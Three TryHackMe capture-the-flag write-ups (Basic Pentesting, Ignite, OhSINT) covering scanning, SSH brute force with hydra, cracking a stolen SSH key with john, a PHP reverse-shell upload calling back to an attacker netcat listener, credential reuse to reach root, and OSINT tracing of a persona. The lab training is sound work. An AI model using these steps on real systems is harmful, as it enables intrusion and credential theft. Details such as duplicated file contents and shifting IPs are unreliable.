title: Basic Pentesting - JT
snippet: Target: 10.10.10.10Attacker: 10.10.14.1IntroductionThe “Basic Pentesting” room on TryHackMe is designed for beginners to gain practical experience in penetration testing. The goal is to walk throug...
content: Target: 10.10.10.10Attacker: 10.10.14.1IntroductionThe “Basic Pentesting” room on TryHackMe is designed for beginners to gain practical experience in penetration testing. The goal is to walk through key phases of an attack such as scanning, enumeration, and exploitation.Room Link: Basic Pentesting – TryHackMeTools Used: nmap, gobuster, hydra,ssh,john2ssh, john, smbclientStep 1: Initial EnumerationNmap Scan$ nmap -sC -sV -oN nmap.txt 10.10.82.249Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 13:25 EDTNmap scan report for 10.10.82.249Host is up (0.084s latency).Not shown: 994 closed tcp ports (reset)PORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.18 (Ubuntu)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)8009/tcp open  ajp13?| ajp-methods: |_  Supported methods: GET HEAD POST OPTIONS8080/tcp open  http-proxy|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.7Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: basic2|   NetBIOS computer name: BASIC2\x00|   Domain name: \x00|   FQDN: basic2|_  System time: 2025-04-16T13:28:25-04:00| smb2-time: |   date: 2025-04-16T17:28:24|_  start_date: N/A| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 210.84 secondsEven though multiple ports are open, let’s first explore port 80 (HTTP) in the browser.Step 2: Web Application Analysis  Gobuster for Directory BruteforceTo discover hidden directories, we run a directory brute-force using Gobuster:    $ gobuster dir -u http://10.10.82.249 -w /usr/share/wordlists/dirb/big.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.82.249[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/big.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.htaccess            (Status: 403) [Size: 296]/.htpasswd            (Status: 403) [Size: 296]/development          (Status: 301) [Size: 318] [--> http://10.10.82.249/development/]/server-status        (Status: 403) [Size: 300]Progress: 20469 / 20470 (100.00%)===============================================================Finished        I navigated to http://10.10.82.249/development/, which exposed an index with two files: dev.txt and j.txt.    Index of /development[ICO]	Name	Last modified	Size	Description[PARENTDIR]	Parent Directory	 	- 	 [TXT]	dev.txt	2018-04-23 14:52 	483 	 [TXT]	j.txt	2018-04-23 13:10 	235 	 Apache/2.4.18 (Ubuntu) Server at 10.10.28.114 Port 80        File Contents/j.txtFor J:I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,and I was able to crack your hash really easily. You know our password policy, so please followit? Change that password ASAP.-K--------------------------------------------------/dev.txtFor J:I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,and I was able to crack your hash really easily. You know our password policy, so please followit? Change that password ASAP.-KStep 2: SMB Analysis  Smbclient for connect to smb service without password    $ smbclient -N -L //10.10.82.249/Anonymous     Sharename       Type      Comment     ---------       ----      -------     Anonymous       Disk           IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)Reconnecting with SMB1 for workgroup listing.     Server               Comment     ---------            -------     Workgroup            Master     ---------            -------     WORKGROUP            BASIC2        Using smbclient, we anonymously access the shared folder Anonymous, which contains the file staff.txt.    $ smbclient -N //10.10.82.249/AnonymousTry "help" to get a list of possible commands.smb: \> ls  .                                   D        0  Thu Apr 19 13:31:20 2018  ..                                  D        0  Thu Apr 19 13:13:06 2018  staff.txt                           N      173  Thu Apr 19 13:29:55 2018             14318640 blocks of size 1024. 10820600 blocks available        Download file staff.txt    smb: \> get staff.txtgetting file \staff.txt of size 173 as staff.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)smb: \> exit        Content file staff.txt$ cat staff.txtAnnouncement to staff:PLEASE do not upload non-work-related items to this share. I know it's all in fun, butthis is how mistakes happen. (This means you too, Jan!)-KayThis gives us two names: Jan (J) and Kay (K).Step 3: Bruteforce Login SSH  Using Hydra for SSH Brute Force      With the username jan and a weak password hint, we use Hydra to perform an SSH brute-force attack using the RockYou wordlist.      $ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.82.249 -I -V  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 16:06:33  [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  [DATA] attacking ssh://10.10.82.249:22/  [ATTEMPT] target 10.10.82.249 - login "jan" - pass "151515" - 782 of 14344400 [child 12] (0/1)  [22][ssh] host: 10.10.82.249   login: jan   password: armando  1 of 1 target successfully completed, 1 valid password found  [WARNING] Writing restore file because 1 final worker threads did not complete until end.  [ERROR] 1 target did not resolve or could not be connected  [ERROR] 0 target did not complete  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-16 14:41:19      Step 4: Gaining Access      Login to SSH:    $ ssh jan@10.10.82.249The authenticity of host '10.10.82.249 (10.10.82.249)' can't be   established.ED25519 key fingerprint is      SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:2: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.82.249' (ED25519) to the list of known hosts. jan@10.10.201.225's password:  Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$            Once logged in as jan, we browse to Kay’s .ssh directory and discover a private SSH key (id_rsa). We extract the hash, crack it with John, and use it to log in as kay.     jan@basic2:~$ cd ../kay/ jan@basic2:/home/kay$ ls -al total 48 drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 . drwxr-xr-x 4 root root 4096 Apr 19  2018 .. -rw------- 1 kay  kay   756 Apr 23  2018 .bash_history -rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout -rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc drwx------ 2 kay  kay  4096 Apr 17  2018 .cache -rw------- 1 root kay   119 Apr 23  2018 .lesshst drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano -rw------- 1 kay  kay    57 Apr 23  2018 pass.bak -rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh -rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful -rw------- 1 root kay   538 Apr 23  2018 .viminfo jan@basic2:/home/kay$ ls -al .ssh total 20 drwxr-xr-x 2 kay kay 4096 Apr 23  2018 . drwxr-xr-x 5 kay kay 4096 Apr 23  2018 .. -rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys -rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa -rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub        Extract the hash from the private key using ssh2john    $ ssh2john id_rsa > hash.txt        Crack hash using john    $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt        Use id_rsa to access ssh          Change the permissions of the id_rsa file        $ chmod 600 id_rsa                    Access SSH         $ ssh kay@10.10.82.249 -i id_rsa Enter passphrase for key 'id_rsa':  Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102        Find final password     kay@basic2:~$ ls pass.bak kay@basic2:~$ cat pass.bak

title: ignite
snippet: IntroductionThe goal of this room is to identify a vulnerability in a PHP-based web server and exploit it by uploading a reverse shell to gain unauthorized access to the system.Room Link: ignite – ...
content: IntroductionThe goal of this room is to identify a vulnerability in a PHP-based web server and exploit it by uploading a reverse shell to gain unauthorized access to the system.Room Link: ignite – TryHackMeTools Used: nmap,nc,reverse shell,browserStep 1: Initial EnumerationNmap Scan$ nmap -sC -sV -oN nmap.txt 10.10.161.15Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 22:38 EDTNmap scan report for 10.10.161.15Host is up (0.071s latency).Not shown: 999 closed tcp ports (reset)PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: Welcome to FUEL CMS|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/fuel/Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.32 secondsOnly port 80 is open. Let’s check the HTTP service in a browser.Step 2: Web Application AnalysisWhile exploring the main page at http://10.10.161.15, I discovered default login credentials embedded in the page content:Username: admin and Password: adminUsing these credentials, I was able to log in to the admin panel located at http://10.10.161.15/fuel.Step 3: Uploading a Reverse Shell  Preparing the Shell          I used a PHP reverse shell and modified the IP and port:        ip = '10.21.167.9' and port = 7777                    Then zipped it for upload:        zip shell.zip shell.php                      Uploading via Fuel CMS          Upload page:        http://10.10.161.15/fuel/assets/create                    Change Type to Image      After upload, the shell was available at:        http://10.10.161.15/assets/images/shell.php                    Step 4: Exploitation (Reverse Shell)  Netcat Listener    $ nc -nlvp 7777        When I visited the shell URL http://10.10.161.15/assets/images/shell.php in a browser, I received a connection:    connect to [10.21.167.9] from (UNKNOWN) [10.10.161.15] 38934        Upgrading the Shell    $ python3 -c 'import pty; pty.spawn("/bin/bash")'www-data@ubuntu:/$         Step 5: Getting the User Flag    www-data@ubuntu:/$ cat /home/www-data/flag.txt        Step 6: Privilege Escalation    I searched the web application files and found credentials inside database.php:    www-data@ubuntu:/$ cat /var/www/html/fuel/application/config/database.php...$db['default'] = array(     'dsn'   => '',     'hostname' => 'localhost',     'username' => 'root',     'password' => 'mememe',     'database' => 'fuel_schema',     'dbdriver' => 'mysqli',     'dbprefix' => '',     'pconnect' => FALSE,     'db_debug' => (ENVIRONMENT !== 'production'),     'cache_on' => FALSE,     'cachedir' => '',     'char_set' => 'utf8',     'dbcollat' => 'utf8_general_ci',     'swap_pre' => '',     'encrypt' => FALSE,     'compress' => FALSE,     'stricton' => FALSE,     'failover' => array(),     'save_queries' => TRUE);...        I switched to the root user:    www-data@ubuntu:/$ su - rootPassword:        Then retrieved the root flag:    root@ubuntu:~# cat /root/root.txt

title: OhSINT
snippet: IntroductionThe OhSINT room on TryHackMe is a beginner-friendly OSINT (Open Source Intelligence) challenge that demonstrates how much sensitive information can be extracted from a single publicly s...
content: IntroductionThe OhSINT room on TryHackMe is a beginner-friendly OSINT (Open Source Intelligence) challenge that demonstrates how much sensitive information can be extracted from a single publicly shared image.Room Link: OhSINT – TryHackMeTools Used: exiftool, Google, Twitter, Wigle.netStep 1: Downloading & Analyzing the ImageThe challenge provides an image file ( WindowsXP_1551719014755.jpg ).I began by downloading the image to my local machine for analysis.A. Extracting Metadata with exiftoolRunning exiftool reveals hidden details:$ exiftool WindowsXP_1551719014755.jpgExifTool Version Number         : 13.10File Name                       : WindowsXP_1551719014755.jpgDirectory                       : .File Size                       : 234 kBFile Modification Date/Time     : 2025:04:15 10:41:04-04:00File Access Date/Time           : 2025:04:15 10:42:24-04:00File Inode Change Date/Time     : 2025:04:15 10:41:04-04:00File Permissions                : -rw-rw-r--File Type                       : JPEGFile Type Extension             : jpgMIME Type                       : image/jpegXMP Toolkit                     : Image::ExifTool 11.27GPS Latitude                    : 54 deg 17' 41.27" NGPS Longitude                   : 2 deg 15' 1.33" WCopyright                       : OWoodflintImage Width                     : 1920Image Height                    : 1080Encoding Process                : Baseline DCT, Huffman codingBits Per Sample                 : 8Color Components                : 3Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)Image Size                      : 1920x1080Megapixels                      : 2.1GPS Latitude Ref                : NorthGPS Longitude Ref               : WestGPS Position                    : 54 deg 17' 41.27" N, 2 deg 15' 1.33" WStep 2:  Answer the questionsQuestion 1:  What is this user’s avatar of?  The Copyright field in the metadata shows: @OWoodflint      Searching @OWoodflint on Google reveals:    A Twitter account with the handle OWoodflint  Answer:  cat Question 2:  What city is this person in?  Found this tweet from @OWoodflint tweet    From my house I can get free wifiBssid: B4:5D:50:AA:86:41 - Go nuts!        Used Wigle to search the BSSID B4:5D:50:AA:86:41Answer:  London Question 3:  What is the SSID of the WAP he connected to?  Used Wigle to search the BSSID B4:5D:50:AA:86:41WPA2 	UnileverWiFi 	 QoS: 7 	  type: infraB4:5D:50:AA:86:41 	 ch: 11  	2017-10-10 - 2024-06-10Answer:  UnileverWiFi Question 4: What is his personal email address?      Searching OWoodflint on Google reveals:    A Github account with the handle OWoodflint     Hi all, I am from London, I like taking photos and open source projects. Follow me on twitter: @OWoodflint This project is a new social network for taking photos in your home town. Project starting soon! Email me if you want to help out: OWoodflint@gmail.com https://oliverwoodflint.wordpress.com/      Answer:  OWoodflint@gmail.com Question 5: What site did you find his email address on?Answer:  Github Question 6: Where has he gone on holiday?      Found personal blog at: https://oliverwoodflint.wordpress.com/     Hey Im in New York right now, so I will update this site right away with new photos!      Answer:  New YorkQuestion 7: What is the person’s password?      Noticed hidden text at the bottom of the post :     Hey Im in New York right now, so I will update this site right away with new photos! pennYDr0pper.!      Answer: pennYDr0pper.!
